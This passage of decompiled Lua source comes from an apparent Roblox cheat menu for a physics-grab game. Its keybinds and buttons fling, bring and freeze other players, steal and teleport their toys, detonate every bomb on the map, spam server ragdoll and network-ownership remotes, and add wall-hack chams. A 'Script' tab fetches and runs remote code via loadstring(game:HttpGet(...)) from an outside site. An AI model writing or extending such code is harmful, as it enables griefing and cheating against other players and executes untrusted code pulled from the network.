                if v1240 ~= vu7.me and (vu56(v1240.Name) and vu120(v1240.Name)) and vu1.w:FindFirstChild(v1240.Name .. "SpawnedInToys") then
                    local v1241, v1242, v1243 = pairs(vu1.w[v1240.Name .. "SpawnedInToys"]:GetChildren())
                    while true do
                        local v1244
                        v1243, v1244 = v1241(v1242, v1243)
                        if v1243 == nil then
                            break
                        end
                        local v1245 = vu199(v1244)
                        if v1244.Name == "PalletLightBrown" and v1245 then
                            vu410(v1245, v1234)
                            v1245.CFrame = vu11.tptoypos
                            task.wait(0.15)
                        end
                    end
                end
            end
            v1234.CFrame = v1236
        end
    end
})
v1079:CreateButton({
    Name = "Tp All Players Toys",
    Callback = function()
        local v1246, v1247 = vu192()
        if v1247 and vu413(v1247) then
            local v1248 = v1246.CFrame
            local v1249, v1250, v1251 = ipairs(Players:GetPlayers())
            while true do
                local v1252
                v1251, v1252 = v1249(v1250, v1251)
                if v1251 == nil then
                    break
                end
                if v1252 ~= vu7.me and (vu56(v1252.Name) and vu120(v1252.Name)) and vu1.w:FindFirstChild(v1252.Name .. "SpawnedInToys") then
                    local v1253, v1254, v1255 = pairs(vu1.w[v1252.Name .. "SpawnedInToys"]:GetChildren())
                    while true do
                        local v1256
                        v1255, v1256 = v1253(v1254, v1255)
                        if v1255 == nil then
                            break
                        end
                        local v1257 = vu199(v1256)
                        if v1257 then
                            vu410(v1257, v1246)
                            v1257.CFrame = vu11.tptoypos
                        end
                    end
                end
            end
            v1246.CFrame = v1248
        end
    end
})
local v1258 = v491:CreateTab("Binds", 7733799901)
v1258:CreateKeybind({
    Name = "Click TP",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ClickTPBind",
    Callback = function(_)
        local v1259 = vu7.mouse.hit
        local v1260 = vu409()
        if v1259 and v1260 then
            v1260.CFrame = CFrame.new(v1259.x, v1259.y + 5, v1259.z)
        end
    end
})
v1258:CreateKeybind({
    Name = "Click TP(hold)",
    CurrentKeybind = "",
    HoldToInteract = true,
    Flag = "ClickTPBindhold",
    Callback = function(_)
        local v1261 = vu7.mouse.hit
        local v1262 = vu409()
        if v1261 and v1262 then
            v1262.CFrame = CFrame.new(v1261.x, v1261.y + 5, v1261.z)
        end
    end
})
v1258:CreateKeybind({
    Name = "Invisble Touch",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "InvisbleTouchBind",
    Callback = function(_)
        local v1263 = vu7.mouse.Target
        if v1263 and v1263.CanCollide then
            local v1264, v1265 = vu192()
            if v1265 and vu413(v1265) then
                vu410(v1263, v1264)
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Fling Player",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "FlingPlayerBind",
    Callback = function(_)
        local v1266, v1267, _, v1268, v1269, _ = vu412(vu7.mouse.Target)
        if v1267 and (vu413(v1267) and (v1269 and (vu413(v1269) and vu56(v1268.Parent)))) then
            vu294(v1266)
        end
    end
})
v1258:CreateKeybind({
    Name = "Bring Player",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "BringPlayeBind",
    Callback = function(_)
        local v1270 = vu7.me.Character
        if v1270 then
            local v1271 = v1270:FindFirstChild("HumanoidRootPart")
            local v1272 = v1271 and vu7.mouse.target
            if v1272 then
                local v1273 = {
                    "Head",
                    "Right Arm",
                    "Right Leg",
                    "Left Arm",
                    "Left Leg",
                    "Torso",
                    "FirePlayerPart",
                    "HumanoidRootPart"
                }
                local v1274 = nil
                local v1275 = nil
                local v1276 = false
                while true do
                    local v1277
                    v1275, v1277 = v1273(v1274, v1275)
                    if v1275 == nil then
                        break
                    end
                    if v1277 == v1272.Name then
                        v1276 = true
                        break
                    end
                end
                if v1276 then
                    vu410(v1272.Parent.Head, v1271)
                    v1272.Parent.HumanoidRootPart.CFrame = v1271.CFrame + v1271.CFrame.LookVector * 3 + Vector3.new(0, 10, 0)
                end
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Bring Object",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "BringObject",
    Callback = function(_)
        local v1278 = vu7.me.Character
        local v1279 = v1278 and v1278:FindFirstChild("HumanoidRootPart")
        if v1279 then
            local v1280 = vu7.mouse.target
            if v1280 and (not v1280.Anchored and v1280.CollisionGroup == "Items") then
                local v1281 = v1279.CFrame
                vu410(v1280, v1279)
                v1279.CFrame = v1281
                v1280.CFrame = v1279.CFrame + v1279.CFrame.LookVector * 3 + Vector3.new(0, 10, 0)
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Stop Velocity",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "StopVelocityBind",
    Callback = function(_)
        local v1282, v1283, v1284 = ipairs(vu7.me.Character:GetDescendants())
        while true do
            local v1285
            v1284, v1285 = v1282(v1283, v1284)
            if v1284 == nil then
                break
            end
            if v1285:IsA("BasePart") then
                local v1286 = Vector3.new(0, 0, 0)
                v1285.RotVelocity = Vector3.new(0, 0, 0)
                v1285.Velocity = v1286
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Zoom",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "Zoom",
    Callback = function(_)
        vu9.zoombind = not vu9.zoombind
        if vu9.zoombind then
            vu8.zoombindv = vu1.w.CurrentCamera.FieldOfView
            vu1.w.CurrentCamera.FieldOfView = 10
        else
            vu1.w.CurrentCamera.FieldOfView = vu8.zoombindv
        end
    end
})
v1258:CreateKeybind({
    Name = "Lock Grab",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "LockGrab",
    Callback = function(_)
        vu1.w.GrabParts:Clone().Parent = vu1.w
        vu1.w.GrabParts:Destroy()
        vu1.w.GrabParts.BeamPart:Destroy()
        vu18 = vu18 + 1
        vu1.w.GrabParts.Name = vu18
    end
})
v1258:CreateKeybind({
    Name = "Delete All Lock Grabs",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "DeleteAllLockGrabsBind",
    Callback = function(_)
        delete_clone_grab()
    end
})
v1258:CreateKeybind({
    Name = "Freeze Grab",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "FreezeGrab",
    Callback = function(_)
        local v1287 = vu1.w:FindFirstChild("GrabParts")
        local v1288 = vu7.mouse.Target
        local v1289, v1290 = vu192()
        if vu413(v1290) then
            local v1291 = nil
            local v1292
            if v1287 then
                v1292 = vu419(v1287, {
                    "GrabPart",
                    "WeldConstraint"
                }).Part1
            else
                v1292 = v1288 or v1291
            end
            if vu415(v1292) then
                v1292 = vu419(v1292.Parent, {
                    "Head"
                })
            end
            vu363(v1292, v1289)
        end
    end
})
v1258:CreateKeybind({
    Name = "Unfreeze Grab",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "UnfreezeGrab",
    Callback = function(_)
        local v1293 = vu7.mouse.target
        if v1293 then
            local v1294 = v1293:FindFirstChild("fzhl")
            local v1295 = v1293:FindFirstChild("fzbg")
            local v1296 = v1293:FindFirstChild("fzbp")
            local v1297, v1298, v1299 = pairs(v1293.Parent:GetDescendants())
            while true do
                local v1300
                v1299, v1300 = v1297(v1298, v1299)
                if v1299 == nil then
                    break
                end
                if v1300.Name == "fgbp" then
                    v1294 = v1300
                end
            end
            local v1301, v1302, v1303 = pairs(v1293.Parent:GetDescendants())
            while true do
                local v1304
                v1303, v1304 = v1301(v1302, v1303)
                if v1303 == nil then
                    break
                end
                if v1304.Name == "fgbg" then
                    v1295 = v1304
                end
            end
            local v1305, v1306, v1307 = pairs(v1293.Parent:GetDescendants())
            while true do
                local v1308
                v1307, v1308 = v1305(v1306, v1307)
                if v1307 == nil then
                    break
                end
                if v1308.Name == "fgobhl" then
                    v1296 = v1308
                end
            end
            if v1294 and (v1295 and v1296) then
                v1294:Destroy()
                v1295:Destroy()
                v1296:Destroy()
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Unfreeze All Grabs",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "UnfreezeAllGrabs",
    Callback = function(_)
        local v1309, v1310, v1311 = pairs(vu1.w:GetDescendants())
        while true do
            local v1312
            v1311, v1312 = v1309(v1310, v1311)
            if v1311 == nil then
                break
            end
            if v1312.Name == "fzhl" then
                v1312:Destroy()
            end
        end
        local v1313, v1314, v1315 = pairs(vu1.w:GetDescendants())
        while true do
            local v1316
            v1315, v1316 = v1313(v1314, v1315)
            if v1315 == nil then
                break
            end
            if v1316.Name == "fzbg" then
                v1316:Destroy()
            end
        end
        local v1317, v1318, v1319 = pairs(vu1.w.hls:GetChildren())
        while true do
            local v1320
            v1319, v1320 = v1317(v1318, v1319)
            if v1319 == nil then
                break
            end
            if v1320.Name == "fzbp" then
                v1320:Destroy()
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Glue Grab",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "GlueGrabBind",
    Callback = function(_)
        if vu9.gluegrab then
            local v1321 = vu7.me.Character
            local v1322 = v1321 and v1321:FindFirstChild("HumanoidRootPart") and vu1.w:FindFirstChild("GrabParts")
            if v1322 then
                local v1323 = v1322.GrabPart.WeldConstraint.Part1
                vu411(v1323)
                table.insert(vu12.ggl, v1323)
            end
        else
            local v1324 = vu7.me.Character
            local v1325 = v1324 and v1324:FindFirstChild("HumanoidRootPart") and vu1.w:FindFirstChild("GrabParts")
            if v1325 then
                local v1326 = v1325.GrabPart.WeldConstraint.Part1
                vu411(v1326)
                table.insert(vu12.ggl, v1326)
                vu9.gluegrab = true
                while vu12.ggl ~= {} and task.wait() do
                    local v1327 = vu7.me.Character
                    local v1328 = v1327 and v1327:FindFirstChild("HumanoidRootPart")
                    if v1328 then
                        local v1329, v1330, v1331 = pairs(vu12.ggl)
                        local v1332 = nil
                        while true do
                            local v1333
                            v1331, v1333 = v1329(v1330, v1331)
                            if v1331 == nil then
                                break
                            end
                            if v1333.Parent then
                                local v1334 = v1333:FindFirstChild("ggfpcf")
                                local v1335 = v1333:FindFirstChild("ggcpcf")
                                local v1336 = v1333:FindFirstChild("gghlov")
                                local v1337 = v1333:FindFirstChild("ggbp")
                                local v1338 = v1333:FindFirstChild("ggbg")
                                if v1332 then
                                    if not v1337 then
                                        v1337 = Instance.new("BodyPosition", v1333)
                                        v1337.D = 100
                                        v1337.MaxForce = vu8.V.mhv3
                                        v1337.Name = "ggbp"
                                    end
                                    if not v1338 then
                                        v1338 = Instance.new("BodyGyro", v1333)
                                        v1338.D = 100
                                        v1338.MaxTorque = vu8.V.mhv3
                                        v1338.Name = "ggbg"
                                    end
                                    if not v1335 then
                                        v1335 = Instance.new("CFrameValue", v1333)
                                        v1335.Value = v1333.CFrame
                                        v1335.Name = "ggcpcf"
                                    end
                                    local v1339 = v1332.ggfpcf.Value
                                    local v1340 = v1332.CFrame
                                    local v1341 = v1335.Value
                                    local function v1343(p1342)
                                        return math.sqrt(p1342)
                                    end
                                    local function v1345(p1344)
                                        return math.cos(p1344)
                                    end
                                    local function v1347(p1346)
                                        return math.sin(p1346)
                                    end
                                    local function v1349(p1348)
                                        return math.acos(p1348)
                                    end
                                    local function v1351(p1350)
                                        return math.asin(p1350)
                                    end
                                    local v1352 = 1 / v1343(v1339.lookVector.x ^ 2 + v1339.lookVector.z ^ 2)
                                    local v1353 = {
                                        x = v1349(v1339.lookVector.x * v1352),
                                        y = v1351(v1339.lookVector.y)
                                    }
                                    local v1354 = 1 / v1343(v1340.lookVector.x ^ 2 + v1340.lookVector.z ^ 2)
                                    local v1355 = {
                                        x = nil,
                                        y = nil
                                    }
                                    if v1340.lookVector.z >= 0 then
                                        v1355.x = v1349(v1340.lookVector.x * v1354)
                                    else
                                        v1355.x = v1349(v1340.lookVector.x * v1354) + (math.pi - v1349(v1340.lookVector.x * v1354)) * 2
                                    end
                                    if v1343(v1340.lookVector.x ^ 2 + v1340.lookVector.z ^ 2) >= 0 then
                                        v1355.y = v1351(v1340.lookVector.y)
                                    else
                                        v1355.y = v1351(v1340.lookVector.y) + (math.pi / 2 - v1351(v1340.lookVector.y)) * 2
                                    end
                                    local v1356 = {
                                        x = v1353.x - v1355.x,
                                        y = v1353.y - v1355.y
                                    }
                                    local v1357 = v1339.Position - v1341.Position
                                    local v1358 = 1 / v1343(v1357.y ^ 2 + v1357.x ^ 2 + v1357.z ^ 2)
                                    local v1359 = v1357 * v1358
                                    local v1360 = 1 / v1343(v1359.x ^ 2 + v1359.z ^ 2)
                                    local v1361 = {
                                        x = nil,
                                        y = nil
                                    }
                                    if v1359.z * v1360 >= 0 then
                                        v1361.x = v1349(v1359.x * v1360)
                                    else
                                        v1361.x = v1349(v1359.x * v1360) + (math.pi - v1349(v1359.x * v1360)) * 2
                                    end
                                    if v1343(v1359.x ^ 2 + v1359.z ^ 2) >= 0 then
                                        v1361.y = v1351(v1359.y)
                                    else
                                        v1361.y = v1351(v1359.y) + (math.pi / 2 - v1351(v1359.y)) * 2
                                    end
                                    local v1362 = {
                                        x = v1361.x - v1356.x,
                                        y = v1361.y - v1356.y
                                    }
                                    local v1363 = Vector3.new(v1345(v1362.x / (1 / v1345(v1362.y))), v1347(v1362.y), v1347(v1362.x / (1 / v1345(v1362.y)))) / v1358
                                    local v1364 = 1 / v1343(v1341.lookVector.x ^ 2 + v1341.lookVector.z ^ 2)
                                    local v1365 = {
                                        x = nil,
                                        y = nil
                                    }
                                    if v1341.lookVector.z * v1364 >= 0 then
                                        v1365.x = v1349(v1341.lookVector.x * v1364)
                                    else
                                        v1365.x = v1349(v1341.lookVector.x * v1364) + (math.pi - v1349(v1341.lookVector.x * v1364)) * 2
                                    end
                                    if v1343(v1341.lookVector.x ^ 2 + v1341.lookVector.z ^ 2) >= 0 then
                                        v1365.y = v1351(v1341.lookVector.y)
                                    else
                                        v1365.y = v1351(v1341.lookVector.y) + (math.pi / 2 - v1351(v1341.lookVector.y)) * 2
                                    end
                                    local v1366 = {
                                        x = v1365.x - v1356.x,
                                        y = v1365.y - v1356.y
                                    }
                                    local v1367 = Vector3.new(v1345(v1366.x / (1 / v1345(v1366.y))), v1347(v1366.y), v1347(v1366.x / (1 / v1345(v1366.y))))
                                    CFrame.new(v1363, v1367)
                                    v1337.Position = v1332.Position - v1363
                                    print(v1363)
                                    print(v1332.Position)
                                    print(v1367)
                                    print(v1332.CFrame.LookVector)
                                    v1338.CFrame = CFrame.new(v1363, v1367)
                                elseif v1334 then
                                    v1332 = v1333
                                else
                                    local v1368 = Instance.new("CFrameValue", v1333)
                                    v1368.Value = v1333.CFrame
                                    v1368.Name = "ggfpcf"
                                    v1332 = v1333
                                end
                                if v1336 then
                                    hl = v1336.Value
                                else
                                    hl = Instance.new("Highlight", vu1.w.hls)
                                    hl.Name = "gghl"
                                    hl.FillColor = Color3.fromRGB(0, 255, 0)
                                    hl.OutlineColor = Color3.fromRGB(0, 255, 0)
                                    hl.FillTransparency = 0.5
                                    hl.OutlineTransparency = 0
                                    hl.Adornee = v1333.Parent
                                    local v1369 = Instance.new("ObjectValue", v1333)
                                    v1369.Name = "gghlov"
                                    v1369.Value = hl
                                end
                                if v1333 ~= v1332 then
                                    vu410(v1333, v1328, hl, vu8.C2)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Unglue All Grabs",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "UnglueAllGrabsBind",
    Callback = function(_)
        vu12.ggl = {}
        local v1370, v1371, v1372 = pairs(vu1.w:GetDescendants())
        while true do
            local v1373
            v1372, v1373 = v1370(v1371, v1372)
            if v1372 == nil then
                break
            end
            if v1373.Name == "gghl" or (v1373.Name == "gghlov" or (v1373.Name == "ggfpcf" or (v1373.Name == "ggbp" or v1373.Name == "ggbg"))) then
                v1373:Destroy()
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Auto Clicker",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AutoClicker",
    Callback = function(_)
        local v1374 = vu7.mouse.target
        if v1374 then
            vu357(v1374)
        end
    end
})
v1258:CreateKeybind({
    Name = "Auto Clicker(all similar nearby)",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AutoClicker(all similar objects are nearby)",
    Callback = function(_)
        local v1375 = vu7.mouse.target
        if v1375 then
            local v1376 = v1375.ClassName
            local v1377 = v1375.CanCollide
            local v1378 = v1375.CanQuery
            local v1379 = v1375.CanTouch
            local v1380 = v1375.CollisionGroup
            local v1381 = v1375.Name
            local v1382, v1383, v1384 = pairs(vu1.w:GetDescendants())
            while true do
                local v1385
                v1384, v1385 = v1382(v1383, v1384)
                if v1384 == nil then
                    break
                end
                if v1385.ClassName == v1376 and (v1385.CanCollide == v1377 and (v1385.CanQuery == v1378 and (v1385.CanTouch == v1379 and (v1385.CollisionGroup == v1380 and (v1385.Name == v1381 and vu414(v1375, v1385)))))) then
                    task.spawn(vu357, v1385)
                end
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Delete Auto Clicker",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "DeleteAutoClicker",
    Callback = function(_)
        local v1386 = vu7.mouse.target
        if v1386:FindFirstChild("ait") then
            v1386.ait.Value:Destroy()
            v1386.ait:Destroy()
        end
    end
})
v1258:CreateKeybind({
    Name = "Delete All Auto Clickers",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "DeleteAllAutoClicker",
    Callback = function(_)
        local v1387, v1388, v1389 = pairs(vu1.w:GetDescendants())
        while true do
            local v1390
            v1389, v1390 = v1387(v1388, v1389)
            if v1389 == nil then
                break
            end
            if v1390.Name == "ait" or v1390.Name == "aithl" then
                v1390:Destroy()
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Explode All Bombs",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ExplodeAllBombs",
    Callback = function(_)
        local v1391 = vu7.me.Character
        local v1392 = v1391 and v1391:FindFirstChild("HumanoidRootPart")
        if v1392 then
            local v1393 = v1392.CFrame
            local v1394 = vu7.mouse.Target
            local v1395 = vu7.mouse.Hit
            local v1396, v1397, v1398 = pairs(vu1.w:GetDescendants())
            local v1399 = {}
            while true do
                local v1400
                v1398, v1400 = v1396(v1397, v1398)
                if v1398 == nil then
                    break
                end
                if v1400.Name == "BombMissile" or v1400.Name == "FireworkMissile" then
                    local v1401 = v1400:FindFirstChild("HitboxBodyTop")
                    if v1401 then
                        while not v1401:FindFirstChild("PartOwner") and task.wait() do
                            if (v1392.Position - v1401.Position).Magnitude > 30 then
                                v1392.CFrame = v1401.CFrame + Vector3.new(0, - 10, 0)
                            end
                            vu411(v1401)
                        end
                        table.insert(v1399, v1400)
                    end
                elseif v1400.Name == "BombBalloon" then
                    local v1402 = v1400:FindFirstChild("Balloon")
                    if v1402 then
                        while not v1402:FindFirstChild("PartOwner") and task.wait() do
                            if (v1392.Position - v1402.Position).Magnitude > 30 then
                                v1392.CFrame = v1402.CFrame + Vector3.new(0, - 10, 0)
                            end
                            vu411(v1402)
                        end
                        table.insert(v1399, v1400)
                    end
                end
            end
            v1392.CFrame = v1393
            local v1403, v1404, v1405 = pairs(v1399)
            while true do
                local v1406
                v1405, v1406 = v1403(v1404, v1405)
                if v1405 == nil then
                    break
                end
                if v1406.Name == "BombMissile" or v1406.Name == "FireworkMissile" then
                    if v1394 then
                        vu229(v1406.PartHitDetector, v1394, v1395.Position)
                    else
                        vu229(v1406.PartHitDetector, v1392, v1392.Position)
                    end
                elseif v1406.Name == "BombBalloon" then
                    if v1394 then
                        vu229(v1406.Balloon, v1394, v1395.Position)
                    else
                        vu229(v1406.Balloon, v1392, v1392.Position)
                    end
                end
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Explode All My Bombs",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "ExplodeAllMyBombs",
    Callback = function(_)
        local v1407 = vu7.me.Character
        local v1408 = v1407 and v1407:FindFirstChild("HumanoidRootPart")
        if v1408 then
            local v1409 = v1408.CFrame
            local v1410 = vu7.mouse.Target
            local v1411 = vu7.mouse.Hit
            local v1412, v1413, v1414 = pairs(vu7.backpack:GetChildren())
            local v1415 = {}
            while true do
                local v1416
                v1414, v1416 = v1412(v1413, v1414)
                if v1414 == nil then
                    break
                end
                if v1416.Name == "BombMissile" or v1416.Name == "FireworkMissile" then
                    local v1417 = v1416:FindFirstChild("HitboxBodyTop")
                    if v1417 then
                        while not v1417:FindFirstChild("PartOwner") and task.wait() do
                            if (v1408.Position - v1417.Position).Magnitude > 30 then
                                v1408.CFrame = v1417.CFrame + Vector3.new(0, - 10, 0)
                            end
                            vu411(v1417)
                        end
                        table.insert(v1415, v1416)
                    end
                elseif v1416.Name == "BombBalloon" then
                    local v1418 = v1416:FindFirstChild("Balloon")
                    if v1418 then
                        while not v1418:FindFirstChild("PartOwner") and task.wait() do
                            if (v1408.Position - v1418.Position).Magnitude > 30 then
                                v1408.CFrame = v1418.CFrame + Vector3.new(0, - 10, 0)
                            end
                            vu411(v1418)
                        end
                        table.insert(v1415, v1416)
                    end
                end
            end
            v1408.CFrame = v1409
            local v1419, v1420, v1421 = pairs(v1415)
            while true do
                local v1422
                v1421, v1422 = v1419(v1420, v1421)
                if v1421 == nil then
                    break
                end
                if v1422.Name == "BombMissile" or v1422.Name == "FireworkMissile" then
                    if v1410 then
                        vu229(v1422.PartHitDetector, v1410, v1411.Position)
                    else
                        vu229(v1422.PartHitDetector, v1408, v1408.Position)
                    end
                elseif v1422.Name == "BombBalloon" then
                    if v1410 then
                        vu229(v1422.Balloon, v1410, v1411.Position)
                    else
                        vu229(v1422.Balloon, v1408, v1408.Position)
                    end
                end
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Delete Object",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "DeleteObjectBind",
    Callback = function(_)
        local v1423 = vu7.mouse.Target
        vu411(v1423)
        wait(0.1)
        if v1423.PartOwner and v1423.PartOwner.Value == vu7.me.Name then
            v1423.CFrame = CFrame.new(363.534424, - 7.35040426, 527.307678, 0.425311029, 3.02851468e-8, - 0.905047238, 8.34827762e-9, 1, 3.73856288e-8, 0.905047238, - 2.34561064e-8, 0.425311029)
        end
    end
})
v1258:CreateKeybind({
    Name = "Sit On Blob",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "SitOnBlob",
    Callback = function(_)
        if vu7.me.Character then
            if not vu7.backpack:FindFirstChild("CreatureBlobman") then
                while not vu7.me.CanSpawnToy.Value do
                    task.wait()
                end
                task.spawn(vu223, "CreatureBlobman")
            end
            while not vu7.backpack:FindFirstChild("CreatureBlobman") do
                task.wait()
            end
            while not vu7.me.Character.Humanoid.SeatPart and task.wait() do
                vu7.backpack:FindFirstChild("CreatureBlobman").VehicleSeat:sit(vu7.me.Character.Humanoid)
            end
        end
    end
})
v1258:CreateKeybind({
    Name = "Create Big Snow Ball",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "CreateBigSnowBall",
    Callback = function(_)
        local v1424 = vu7.me.Character
        local v1425 = v1424 and v1424:FindFirstChild("HumanoidRootPart")
        if v1425 then
            while vu7.backpack:FindFirstChild("BallSnowball") and task.wait() do
                vu7.backpack.BallSnowball.Name = "BallSnowballO"
            end
            while not vu7.me.CanSpawnToy.Value do
                task.wait()
            end
            task.spawn(vu220, "BallSnowball")
            while not vu7.backpack:FindFirstChild("BallSnowball") do
                task.wait()
            end
            local v1426 = vu7.backpack:FindFirstChild("BallSnowball")
            v1426.Name = "BallSnowballN"
            v1426.SoundPart.CanTouch = false
            while not v1426.SoundPart:FindFirstChild("PartOwner") and task.wait() do
                if (v1425.Position - v1426.SoundPart.Position).Magnitude > 30 then
                    v1425.CFrame = v1426.CFrame + Vector3.new(0, - 10, 0)
                end
                vu411(v1426.SoundPart)
            end
            local v1427 = Instance.new("BodyPosition", v1426.SoundPart)
            v1427.MaxForce = vu8.V.mhv3
            v1427.D = 100
            v1427.Position = Vector3.new(- 410, 228, 522)
            task.wait(1)
            v1427.D = 0
            while v1426.SoundPart.Size.X < 70 and task.wait() do
                v1427.Position = Vector3.new(- 410, 229 - v1426.SoundPart.Size.X, 520)
                if not v1426.SoundPart:FindFirstChild("PartOwner") then
                    while not v1426.SoundPart:FindFirstChild("PartOwner") and task.wait() do
                        if (v1425.Position - v1426.SoundPart.Position).Magnitude <= 30 then
                            vu411(v1426.SoundPart)
                        else
                            local v1428 = v1425.CFrame
                            while not v1426.SoundPart:FindFirstChild("PartOwner") and task.wait() do
                                v1425.CFrame = v1426.SoundPart.CFrame + Vector3.new(0, - 10, 0)
                                vu411(v1426.SoundPart)
                            end
                            v1425.CFrame = v1428
                        end
                    end
                end
            end
            v1427.D = 100
            v1427.Position = Vector3.new(0, 1000, 0)
            v1426.SoundPart.CanTouch = true
            v1427:Destroy()
            v1426.SoundPart.CFrame = v1425.CFrame + Vector3.new(0, 100, 0)
        end
    end
})
if vu9.vhsows or v407(vu12.admins, vu7.me.UserId) then
    v1258:CreateKeybind({
        Name = "ULTRA ANTIGRAB",
        CurrentKeybind = "",
        HoldToInteract = false,
        Flag = "ULTRAANTIGRAB",
        Callback = function(_)
            local v1429, v1430 = vu192()
            if v1430 and vu413(v1430) then
                if vu7.backpack:FindFirstChild("antigrabblob") then
                    vu225(vu7.backpack.antigrabblob)
                else
                    repeat
                        task.wait()
                    until not vu7.me.InPlot.Value
                    repeat
                        task.wait()
                    until vu7.me.CanSpawnToy.Value
                    task.spawn(vu223, "CreatureBlobman")
                    local v1431, v1432, v1433 = pairs(vu7.backpack:GetChildren())
                    while true do
                        local v1434
                        v1433, v1434 = v1431(v1432, v1433)
                        if v1433 == nil then
                            break
                        end
                        if v1434.Name == "CreatureBlobman" then
                            vu421(v1434, "notantigrabblob", true)
                        end
                    end
                    repeat
                        task.wait()
                    until vu7.backpack:FindFirstChild("CreatureBlobman") and not vu7.backpack.CreatureBlobman:FindFirstChild("antigrabblob")
                    local v1435 = vu7.backpack.CreatureBlobman
                    v1435.Name = "antigrabblob"
                    task.wait(0.3)
                    for _ = 1, 55 do
                        vu7.Events.Ragdoll:FireServer(v1429, 0)
                        task.wait()
                    end
                    repeat
                        vu7.Events.Ragdoll:FireServer(v1429, 0)
                        v1435.VehicleSeat:sit(v1430)
                        task.wait(0.5)
                    until v1430.SeatPart
                    for _ = 1, 55 do
                        vu7.Events.Ragdoll:FireServer(v1429, 0)
                        task.wait()
                    end
                    v1430.Sit = false
                    vu349(v1435.GrabbableHitbox, v1429)
                    vu406(v1435.VehicleSeat, "antigrabblob", vu8.V.mhv3, Vector3.new(0, 10000000, 0), 100)
                end
            end
        end
    })
    v1258:CreateButton({
        Name = "ffffffffff",
        Callback = function()
            local v1436, v1437, v1438 = pairs(workspace:GetDescendants())
            while true do
                local v1439
                v1438, v1439 = v1436(v1437, v1438)
                if v1438 == nil then
                    break
                end
                if v1439.Name == "CreatureBlobman" then
                    local v1440 = {
                        v1439.RightDetector,
                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
                        v1439.RightDetector.RightWeld
                    }
                    v1439.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(v1440))
                    local v1441 = {
                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
                        CFrame.new(v1439.RightDetector.Position) * CFrame.Angles(- 0, - 0, - 0)
                    }
                    game:GetService("ReplicatedStorage").GrabEvents.SetNetworkOwner:FireServer(unpack(v1441))
                end
            end
        end
    })
    v1258:CreateToggle({
        Name = "ffffffffffffffffffff",
        CurrentValue = false,
        Flag = "",
        Callback = function(p1442)
            wtrhrhrthrth = p1442
            if wtrhrhrthrth then
                spawn(function()
                    while wtrhrhrthrth do
                        local v1443 = game:GetService("Players").LocalPlayer.Character
                        if v1443 and v1443:FindFirstChild("HumanoidRootPart") then
                            local v1444 = {
                                v1443.HumanoidRootPart,
                                0
                            }
                            game:GetService("ReplicatedStorage").CharacterEvents.RagdollRemote:FireServer(unpack(v1444))
                        end
                        wait(1e-55)
                    end
                end)
            end
        end
    })
end
local v1445 = v491:CreateTab("Script", 7733920644)
v1445:CreateButton({
    Name = "Open Dex Explorer V2",
    Callback = function()
        loadstring(game:HttpGet("https://ithinkimandrew.site/scripts/tools/dark-dex.lua"))()
    end
})
v1445:CreateButton({
    Name = "Rejoin Game",
    Callback = function()
        local vu1446 = game:GetService("TeleportService")
        game:GetService("Players")
        local vu1447 = vu7.me
        local v1450 = coroutine.create(function()
            local v1448, v1449 = pcall(function()
                vu1446:Teleport(game.PlaceId, vu1447)
            end)
            if v1449 and not v1448 then
                warn(v1449)
            end
        end)
        coroutine.resume(v1450)
    end
})
local v1451 = v491:CreateTab("Visual", 7733774602)
v1451:CreateSection("Chams")
v1451:CreateToggle({
    Name = "Chams Toggle",
    CurrentValue = false,
    Flag = "ChamsToggle",
    Callback = function(p1452)
        chamst = p1452
        vu429()
    end
})
v1451:CreateColorPicker({
    Name = "Fill Color",
    Color = Color3.fromRGB(0, 0, 0),
    Flag = "FillColor",
    Callback = function(p1453)
        vu15 = p1453
        vu429()
    end
})
v1451:CreateSlider({
    Name = "Fill Transparency",
    Range = {
        0,
        1
    },
    Increment = 0.1,
    Suffix = "",
    CurrentValue = 0.7,
    Flag = "FillTransparency",
    Callback = function(p1454)
        vu8.chamsft = p1454
        vu429()
    end
})
v1451:CreateColorPicker({
    Name = "Outline Color",
    Color = Color3.fromRGB(0, 0, 0),
    Flag = "OutlineColor",
    Callback = function(p1455)
        vu16 = p1455
        vu429()
    end
})
v1451:CreateSlider({
    Name = "Outline Transparency",
    Range = {
        0,
        1
    },
    Increment = 0.1,
    Suffix = "",
    CurrentValue = 0,
    Flag = "OutlineTransparency",
    Callback = function(p1456)
        vu8.chamsot = p1456
        vu429()
    end
})
v1451:CreateSection("FPS Boost")
v1451:CreateDropdown({
    Name = "Graphics Quality",
